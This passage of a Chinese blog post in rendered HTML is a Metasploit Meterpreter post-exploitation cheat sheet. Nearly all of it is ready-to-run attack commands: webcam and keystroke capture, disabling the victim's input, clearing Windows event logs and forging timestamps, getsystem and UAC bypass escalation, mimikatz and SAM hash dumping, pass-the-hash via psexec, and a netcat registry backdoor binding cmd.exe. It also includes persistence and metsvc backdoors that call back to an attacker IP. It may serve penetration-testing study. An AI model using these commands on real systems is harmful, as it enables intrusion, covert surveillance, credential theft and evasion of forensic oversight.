# 查看当前活跃进程    kill &lt;PID值&gt; 杀死进程</span><br><span class="line">idletime #查看目标机闲置时间</span><br><span class="line">reboot / shutdown   #重启/关机</span><br><span class="line">shell #进入目标机cmd shell</span><br></pre></td></tr></table></figure>
+<h4 id="2）uictl开关键盘-鼠标"><a href="#2）uictl开关键盘-鼠标" class="headerlink" title="2）uictl开关键盘/鼠标"></a>2）uictl开关键盘/鼠标</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">uictl [enable/disable] [keyboard/mouse/all]  #开启或禁止键盘/鼠标</span><br><span class="line">uictl disable mouse  #禁用鼠标</span><br><span class="line">uictl disable keyboard  #禁用键盘</span><br></pre></td></tr></table></figure>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180806232238-8d78731c-998c-1.png" alt=""></p>
+<h4 id="3）webcam摄像头命令"><a href="#3）webcam摄像头命令" class="headerlink" title="3）webcam摄像头命令"></a>3）webcam摄像头命令</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">webcam_list  #查看摄像头</span><br><span class="line">webcam_snap   #通过摄像头拍照</span><br><span class="line">webcam_stream   #通过摄像头开启视频</span><br></pre></td></tr></table></figure>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180806232238-8d93ac72-998c-1.png" alt=""><br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180806232238-8da675dc-998c-1.png" alt=""></p>
+<h4 id="4）execute执行文件"><a href="#4）execute执行文件" class="headerlink" title="4）execute执行文件"></a>4）execute执行文件</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">execute #在目标机中执行文件</span><br><span class="line">execute -H -i -f cmd.exe # 创建新进程cmd.exe，-H不可见，-i交互</span><br></pre></td></tr></table></figure>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180806232238-8db2c63e-998c-1.png" alt=""></p>
+<h4 id="5）migrate进程迁移"><a href="#5）migrate进程迁移" class="headerlink" title="5）migrate进程迁移"></a>5）migrate进程迁移</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">getpid    # 获取当前进程的pid</span><br><span class="line">ps   # 查看当前活跃进程</span><br><span class="line">migrate &lt;pid值&gt;    #将Meterpreter会话移植到指定pid值进程中</span><br><span class="line">kill &lt;pid值&gt;   #杀死进程</span><br></pre></td></tr></table></figure>
+<h4 id="6）clearav清除日志"><a href="#6）clearav清除日志" class="headerlink" title="6）clearav清除日志"></a>6）clearav清除日志</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">clearav  #清除windows中的应用程序日志、系统日志、安全日志</span><br></pre></td></tr></table></figure>
+<h3 id="0x02-文件系统命令"><a href="#0x02-文件系统命令" class="headerlink" title="0x02.文件系统命令"></a>0x02.文件系统命令</h3><h4 id="1）基本文件系统命令"><a href="#1）基本文件系统命令" class="headerlink" title="1）基本文件系统命令"></a>1）基本文件系统命令</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">getwd 或者pwd # 查看当前工作目录  </span><br><span class="line">ls</span><br><span class="line">cd</span><br><span class="line">search -f *pass*       # 搜索文件  -h查看帮助</span><br><span class="line">cat c:\\lltest\\lltestpasswd.txt  # 查看文件内容</span><br><span class="line">upload /tmp/hack.txt C:\\lltest  # 上传文件到目标机上</span><br><span class="line">download c:\\lltest\\lltestpasswd.txt /tmp/ # 下载文件到本机上</span><br><span class="line">edit c:\\1.txt #编辑或创建文件  没有的话，会新建文件</span><br><span class="line">rm C:\\lltest\\hack.txt</span><br><span class="line">mkdir lltest2  #只能在当前目录下创建文件夹</span><br><span class="line">rmdir lltest2  #只能删除当前目录下文件夹</span><br><span class="line">getlwd   或者 lpwd   #操作攻击者主机 查看当前目录</span><br><span class="line">lcd /tmp   #操作攻击者主机 切换目录</span><br></pre></td></tr></table></figure>
+<h4 id="2）timestomp伪造时间戳"><a href="#2）timestomp伪造时间戳" class="headerlink" title="2）timestomp伪造时间戳"></a>2）timestomp伪造时间戳</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">timestomp C:// -h   #查看帮助</span><br><span class="line">timestomp -v C://2.txt   #查看时间戳</span><br><span class="line">timestomp C://2.txt -f C://1.txt #将1.txt的时间戳复制给2.txt</span><br></pre></td></tr></table></figure>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180806232238-8dc36548-998c-1.png" alt=""></p>
+<h3 id="0x03-网络命令"><a href="#0x03-网络命令" class="headerlink" title="0x03.网络命令"></a>0x03.网络命令</h3><h4 id="1）基本网络命令"><a href="#1）基本网络命令" class="headerlink" title="1）基本网络命令"></a>1）基本网络命令</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ipconfig/ifconfig</span><br><span class="line">netstat –ano</span><br><span class="line">arp</span><br><span class="line">getproxy   #查看代理信息</span><br><span class="line">route   #查看路由</span><br></pre></td></tr></table></figure>
+<h4 id="2）portfwd端口转发"><a href="#2）portfwd端口转发" class="headerlink" title="2）portfwd端口转发"></a>2）portfwd端口转发</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">portfwd add -l 6666 -p 3389 -r 127.0.0.1 #将目标机的3389端口转发到本地6666端口</span><br></pre></td></tr></table></figure>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180806232238-8dd84710-998c-1.png" alt=""><br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180806232239-8df589f6-998c-1.png" alt=""></p>
+<h4 id="3）autoroute添加路由"><a href="#3）autoroute添加路由" class="headerlink" title="3）autoroute添加路由"></a>3）autoroute添加路由</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">run autoroute –h #查看帮助</span><br><span class="line">run autoroute -s 192.168.159.0/24  #添加到目标环境网络</span><br><span class="line">run autoroute –p  #查看添加的路由</span><br></pre></td></tr></table></figure>
+<p>然后可以利用arp_scanner、portscan等进行扫描<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/gather/arp_scanner RHOSTS=192.168.159.0/24</span><br><span class="line">run auxiliary/scanner/portscan/tcp RHOSTS=192.168.159.144 PORTS=3389</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180806232239-8e0bdbca-998c-1.png" alt=""><br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180806232239-8e1d7ec0-998c-1.png" alt=""></p>
+<h4 id="4）Socks4a代理"><a href="#4）Socks4a代理" class="headerlink" title="4）Socks4a代理"></a>4）Socks4a代理</h4><p>autoroute添加完路由后，还可以利用msf自带的sock4a模块进行Socks4a代理<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msf&gt; use auxiliary/server/socks4a </span><br><span class="line">msf &gt; set srvhost 127.0.0.1</span><br><span class="line">msf &gt; set srvport 1080</span><br><span class="line">msf &gt; run</span><br></pre></td></tr></table></figure></p>
+<p>然后vi /etc/proxychains.conf   #添加 socks4 127.0.0.1 1080<br>最后proxychains  使用Socks4a代理访问</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180806232239-8e2ebffa-998c-1.png" alt=""></p>
+<h3 id="0x04-信息收集"><a href="#0x04-信息收集" class="headerlink" title="0x04.信息收集"></a>0x04.信息收集</h3><p>信息收集的脚本位于：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/usr/share/metasploit-framework/modules/post/windows/gather</span><br><span class="line">/usr/share/metasploit-framework/modules/post/linux/gather</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180806232239-8e454716-998c-1.png" alt=""></p>
+<p>信息收集的脚本较多，仅列几个常用的：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/gather/checkvm #是否虚拟机</span><br><span class="line">run post/linux/gather/checkvm #是否虚拟机</span><br><span class="line">run post/windows/gather/forensics/enum_drives #查看分区</span><br><span class="line">run post/windows/gather/enum_applications #获取安装软件信息</span><br><span class="line">run post/windows/gather/dumplinks   #获取最近的文件操作</span><br><span class="line">run post/windows/gather/enum_ie  #获取IE缓存</span><br><span class="line">run post/windows/gather/enum_chrome   #获取Chrome缓存</span><br><span class="line">run post/windows/gather/enum_patches  #补丁信息</span><br><span class="line">run post/windows/gather/enum_domain  #查找域控</span><br></pre></td></tr></table></figure></p>
+<h3 id="0x05-提权"><a href="#0x05-提权" class="headerlink" title="0x05.提权"></a>0x05.提权</h3><h4 id="1-getsystem提权"><a href="#1-getsystem提权" class="headerlink" title="1)getsystem提权"></a>1)getsystem提权</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getsystem</span><br></pre></td></tr></table></figure>
+<p>getsystem工作原理：<br>①getsystem创建一个新的Windows服务，设置为SYSTEM运行，当它启动时连接到一个命名管道。<br>②getsystem产生一个进程，它创建一个命名管道并等待来自该服务的连接。<br>③Windows服务已启动，导致与命名管道建立连接。<br>④该进程接收连接并调用ImpersonateNamedPipeClient，从而为SYSTEM用户创建模拟令牌。<br>然后用新收集的SYSTEM模拟令牌产生cmd.exe，并且我们有一个SYSTEM特权进程。<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180806232239-8e5f42e2-998c-1.png" alt=""></p>
+<h4 id="2-bypassuac"><a href="#2-bypassuac" class="headerlink" title="2)bypassuac"></a>2)bypassuac</h4><p>内置多个pypassuac脚本，原理有所不同，使用方法类似，运行后返回一个新的会话，需要再次执行getsystem获取系统权限，如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/local/bypassuac</span><br><span class="line">use exploit/windows/local/bypassuac_injection</span><br><span class="line">use windows/local/bypassuac_vbs</span><br><span class="line">use windows/local/ask</span><br></pre></td></tr></table></figure></p>
+<p>如使用bypassuac.rb脚本：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/windows/local/bypassuac</span><br><span class="line">msf &gt; set SESSION 2</span><br><span class="line">msf &gt; run</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180806232239-8e75a848-998c-1.png" alt=""></p>
+<h4 id="3-内核漏洞提权"><a href="#3-内核漏洞提权" class="headerlink" title="3)内核漏洞提权"></a>3)内核漏洞提权</h4><p>可先利用enum_patches模块 收集补丁信息，然后查找可用的exploits进行提权<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/gather/enum_patches  #查看补丁信息</span><br><span class="line">msf &gt; use exploit/windows/local/ms13_053_schlamperei</span><br><span class="line">msf &gt; set SESSION 2</span><br><span class="line">msf &gt; exploit</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180806232240-8e85924e-998c-1.png" alt=""><br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180806232240-8e9b89e6-998c-1.png" alt=""></p>
+<h3 id="0x06-mimikatz抓取密码"><a href="#0x06-mimikatz抓取密码" class="headerlink" title="0x06.mimikatz抓取密码"></a>0x06.mimikatz抓取密码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">load mimikatz    #help mimikatz 查看帮助</span><br><span class="line">wdigest  #获取Wdigest密码</span><br><span class="line">mimikatz_command -f samdump::hashes  #执行mimikatz原始命令</span><br><span class="line">mimikatz_command -f sekurlsa::searchPasswords</span><br></pre></td></tr></table></figure>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180806232240-8eac2e2c-998c-1.png" alt=""><br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180806232240-8ebb6bc6-998c-1.png" alt=""></p>
+<h3 id="0x07-远程桌面-amp-截屏"><a href="#0x07-远程桌面-amp-截屏" class="headerlink" title="0x07.远程桌面&amp;截屏"></a>0x07.远程桌面&amp;截屏</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">enumdesktops  #查看可用的桌面</span><br><span class="line">getdesktop    #获取当前meterpreter 关联的桌面</span><br><span class="line">set_desktop   #设置meterpreter关联的桌面  -h查看帮助</span><br><span class="line">screenshot  #截屏</span><br><span class="line">use espia  #或者使用espia模块截屏  然后输入screengrab</span><br><span class="line">run vnc  #使用vnc远程桌面连接</span><br></pre></td></tr></table></figure>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180806232240-8ee6331a-998c-1.png" alt=""><br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180806232241-8f1a70c6-998c-1.png" alt=""></p>
+<h3 id="0x08-开启rdp-amp-添加用户"><a href="#0x08-开启rdp-amp-添加用户" class="headerlink" title="0x08.开启rdp&amp;添加用户"></a>0x08.开启rdp&amp;添加用户</h3><h4 id="1-getgui命令"><a href="#1-getgui命令" class="headerlink" title="1)getgui命令"></a>1)getgui命令</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">run getgui –h #查看帮助</span><br><span class="line">run getgui -e #开启远程桌面</span><br><span class="line">run getgui -u lltest2 -p 123456   #添加用户</span><br><span class="line">run getgui -f 6661 –e   #3389端口转发到6661</span><br></pre></td></tr></table></figure>
+<p>getgui 系统不推荐，推荐使用run post/windows/manage/enable_rdp<br>getgui添加用户时，有时虽然可以成功添加用户，但是没有权限通过远程桌面登陆<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180806232241-8f3485ce-998c-1.png" alt=""><br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180806232241-8f42c288-998c-1.png" alt=""></p>
+<h4 id="2-enable-rdp脚本"><a href="#2-enable-rdp脚本" class="headerlink" title="2)enable_rdp脚本"></a>2)enable_rdp脚本</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/manage/enable_rdp  #开启远程桌面</span><br><span class="line">run post/windows/manage/enable_rdp USERNAME=www2 PASSWORD=123456 #添加用户</span><br><span class="line">run post/windows/manage/enable_rdp FORWARD=true LPORT=6662	#将3389端口转发到6662</span><br></pre></td></tr></table></figure>
+<p>脚本位于/usr/share/metasploit-framework/modules/post/windows/manage/enable_rdp.rb<br>通过enable_rdp.rb脚本可知：开启rdp是通过reg修改注册表；添加用户是调用cmd.exe 通过net user添加；端口转发是利用的portfwd命令<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180806232241-8f547726-998c-1.png" alt=""><br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180806232241-8f692b80-998c-1.png" alt=""></p>
+<h3 id="0x09-键盘记录"><a href="#0x09-键盘记录" class="headerlink" title="0x09.键盘记录"></a>0x09.键盘记录</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">keyscan_start  #开始键盘记录</span><br><span class="line">keyscan_dump   #导出记录数据</span><br><span class="line">keyscan_stop #结束键盘记录</span><br></pre></td></tr></table></figure>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180806232241-8f75ddc6-998c-1.png" alt=""></p>
+<h3 id="0x10-sniffer抓包"><a href="#0x10-sniffer抓包" class="headerlink" title="0x10.sniffer抓包"></a>0x10.sniffer抓包</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use sniffer</span><br><span class="line">sniffer_interfaces   #查看网卡</span><br><span class="line">sniffer_start 2   #选择网卡 开始抓包</span><br><span class="line">sniffer_stats 2   #查看状态</span><br><span class="line">sniffer_dump 2 /tmp/lltest.pcap  #导出pcap数据包</span><br><span class="line">sniffer_stop 2   #停止抓包</span><br></pre></td></tr></table></figure>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180806232241-8f86f804-998c-1.png" alt=""></p>
+<h3 id="0x11-注册表操作"><a href="#0x11-注册表操作" class="headerlink" title="0x11.注册表操作"></a>0x11.注册表操作</h3><h4 id="1-注册表基本命令"><a href="#1-注册表基本命令" class="headerlink" title="1)注册表基本命令"></a>1)注册表基本命令</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">reg –h</span><br><span class="line">    -d   注册表中值的数据.    -k   注册表键路径    -v   注册表键名称</span><br><span class="line">    enumkey 枚举可获得的键    setval 设置键值    queryval 查询键值数据</span><br></pre></td></tr></table></figure>
+<h4 id="2-注册表设置nc后门"><a href="#2-注册表设置nc后门" class="headerlink" title="2)注册表设置nc后门"></a>2)注册表设置nc后门</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">upload /usr/share/windows-binaries/nc.exe C:\\windows\\system32 #上传nc</span><br><span class="line">reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run   #枚举run下的key</span><br><span class="line">reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v lltest_nc -d &apos;C:\windows\system32\nc.exe -Ldp 443 -e cmd.exe&apos; #设置键值</span><br><span class="line">reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\Run -v lltest_nc   #查看键值</span><br><span class="line"></span><br><span class="line">nc -v 192.168.159.144 443  #攻击者连接nc后门</span><br></pre></td></tr></table></figure>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180806232241-8f98f61c-998c-1.png" alt=""><br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180806232242-8fbd4d32-998c-1.png" alt=""><br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180806232242-8fcc6452-998c-1.png" alt=""></p>
+<h3 id="0x12-令牌操纵"><a href="#0x12-令牌操纵" class="headerlink" title="0x12.令牌操纵"></a>0x12.令牌操纵</h3><h4 id="1-incognito假冒令牌"><a href="#1-incognito假冒令牌" class="headerlink" title="1)incognito假冒令牌"></a>1)incognito假冒令牌</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">use incognito      #help incognito  查看帮助</span><br><span class="line">list_tokens -u    #查看可用的token</span><br><span class="line">impersonate_token &apos;NT AUTHORITY\SYSTEM&apos;  #假冒SYSTEM token</span><br><span class="line">或者impersonate_token NT\ AUTHORITY\\SYSTEM #不加单引号 需使用\\</span><br><span class="line">execute -f cmd.exe -i –t    # -t 使用假冒的token 执行</span><br><span class="line">或者直接shell</span><br><span class="line">rev2self   #返回原始token</span><br></pre></td></tr></table></figure>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180806232242-8fdf8654-998c-1.png" alt=""></p>
+<h4 id="2-steal-token窃取令牌"><a href="#2-steal-token窃取令牌" class="headerlink" title="2)steal_token窃取令牌"></a>2)steal_token窃取令牌</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">steal_token &lt;pid值&gt;   #从指定进程中窃取token   先ps</span><br><span class="line">drop_token  #删除窃取的token</span><br></pre></td></tr></table></figure>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180806232242-8fee2862-998c-1.png" alt=""></p>
+<h3 id="0x13-哈希利用"><a href="#0x13-哈希利用" class="headerlink" title="0x13.哈希利用"></a>0x13.哈希利用</h3><h4 id="1-获取哈希"><a href="#1-获取哈希" class="headerlink" title="1)获取哈希"></a>1)获取哈希</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/gather/smart_hashdump  #从SAM导出密码哈希</span><br><span class="line">#需要SYSTEM权限</span><br></pre></td></tr></table></figure>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180806232242-8ffec58c-998c-1.png" alt=""></p>
+<h4 id="2-PSExec哈希传递"><a href="#2-PSExec哈希传递" class="headerlink" title="2)PSExec哈希传递"></a>2)PSExec哈希传递</h4><p>通过smart_hashdump获取用户哈希后，可以利用psexec模块进行哈希传递攻击<br>前提条件：①开启445端口 smb服务；②开启admin$共享<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/windows/smb/psexec</span><br><span class="line">msf &gt; set payload windows/meterpreter/reverse_tcp</span><br><span class="line">msf &gt; set LHOST 192.168.159.134</span><br><span class="line">msf &gt; set LPORT 443</span><br><span class="line">msf &gt; set RHOST 192.168.159.144</span><br><span class="line">msf &gt;set SMBUser Administrator</span><br><span class="line">msf &gt;set SMBPass aad3b4*****04ee:5b5f00*****c424c</span><br><span class="line">msf &gt;set SMBDomain  WORKGROUP   #域用户需要设置SMBDomain</span><br><span class="line">msf &gt;exploit</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180806232242-900da246-998c-1.png" alt=""><br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180806232242-901e3d36-998c-1.png" alt=""></p>
+<h3 id="0x14-后门植入"><a href="#0x14-后门植入" class="headerlink" title="0x14.后门植入"></a>0x14.后门植入</h3><p>metasploit自带的后门有两种方式启动的，一种是通过启动项启动(persistence)，一种是通过服务启动(metsvc)，另外还可以通过persistence_exe自定义后门文件。</p>
+<h4 id="1-persistence启动项后门"><a href="#1-persistence启动项后门" class="headerlink" title="1)persistence启动项后门"></a>1)persistence启动项后门</h4><p>在C:\Users***\AppData\Local\Temp\目录下，上传一个vbs脚本<br>在注册表HKLM\Software\Microsoft\Windows\CurrentVersion\Run\加入开机启动项<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">run persistence –h  #查看帮助</span><br><span class="line">run persistence -X -i 5 -p 6661 -r 192.168.159.134</span><br><span class="line">#-X指定启动的方式为开机自启动，-i反向连接的时间间隔(5s) –r 指定攻击者的ip</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180806232242-902cd47c-998c-1.png" alt=""><br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180806232242-9041d688-998c-1.png" alt=""></p>
+<p><strong>连接后门</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/multi/handler</span><br><span class="line">msf &gt; set payload windows/meterpreter/reverse_tcp</span><br><span class="line">msf &gt; set LHOST 192.168.159.134</span><br><span class="line">msf &gt; set LPORT 6661</span><br><span class="line">msf &gt; exploit</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180806232243-9051352e-998c-1.png" alt=""></p>
+<h4 id="2-metsvc服务后门"><a href="#2-metsvc服务后门" class="headerlink" title="2)metsvc服务后门"></a>2)metsvc服务后门</h4><p>在C:\Users***\AppData\Local\Temp\上传了三个文件（metsrv.x86.dll、metsvc-server.exe、metsvc.exe），通过服务启动，服务名为meterpreter<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">run metsvc –h   # 查看帮助</span><br><span class="line">run metsvc –A   #自动安装后门</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180806232243-9060162a-998c-1.png" alt=""><br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180806232243-9077bb4a-998c-1.png" alt=""></p>
+<p><strong>连接后门</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/multi/handler</span><br><span class="line">msf &gt; set payload windows/metsvc_bind_tcp</span><br><span class="line">msf &gt; set RHOST 192.168.159.144</span><br><span class="line">msf &gt; set LPORT 31337</span><br><span class="line">msf &gt; exploit</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180806232243-90b333b4-998c-1.png" alt=""></p>
+<h3 id="0x15-扫描脚本"><a href="#0x15-扫描脚本" class="headerlink" title="0x15.扫描脚本"></a>0x15.扫描脚本</h3><p>扫描的脚本位于：<br>/usr/share/metasploit-framework/modules/auxiliary/scanner/<br>扫描的脚本较多，仅列几个代表：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/http/dir_scanner</span><br><span class="line">use auxiliary/scanner/http/jboss_vulnscan</span><br><span class="line">use auxiliary/scanner/mssql/mssql_login</span><br><span class="line">use auxiliary/scanner/mysql/mysql_version</span><br><span class="line">use auxiliary/scanner/oracle/oracle_login</span><br></pre></td></tr></table></figure></p>
+<p><strong>参考:</strong><br><a href="https://null-byte.wonderhowto.com/how-to/hack-like-pro-ultimate-command-cheat-sheet-for-metasploits-meterpreter-0149146/" target="_blank" rel="noopener">https://null-byte.wonderhowto.com/how-to/hack-like-pro-ultimate-command-cheat-sheet-for-metasploits-meterpreter-0149146/</a><br><a href="https://thehacktoday.com/metasploit-commands/" target="_blank" rel="noopener">https://thehacktoday.com/metasploit-commands/</a><br><a href="https://www.offensive-security.com/metasploit-unleashed/fun-incognito/" target="_blank" rel="noopener">https://www.offensive-security.com/metasploit-unleashed/fun-incognito/</a><br><a href="https://www.offensive-security.com/metasploit-unleashed/persistent-netcat-backdoor/" target="_blank" rel="noopener">https://www.offensive-security.com/metasploit-unleashed/persistent-netcat-backdoor/</a><br><a href="https://www.offensive-security.com/metasploit-unleashed/privilege-escalation/" target="_blank" rel="noopener">https://www.offensive-security.com/metasploit-unleashed/privilege-escalation/</a><br><a href="http://www.hackingarticles.in/7-ways-to-privilege-escalation-of-windows-7-pc-bypass-uac/" target="_blank" rel="noopener">http://www.hackingarticles.in/7-ways-to-privilege-escalation-of-windows-7-pc-bypass-uac/</a><br><a href="https://www.offensive-security.com/metasploit-unleashed/psexec-pass-hash/" target="_blank" rel="noopener">https://www.offensive-security.com/metasploit-unleashed/psexec-pass-hash/</a><br><a href="http://wooyun.jozxing.cc/static/drops/tips-2227.html" target="_blank" rel="noopener">http://wooyun.jozxing.cc/static/drops/tips-2227.html</a></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
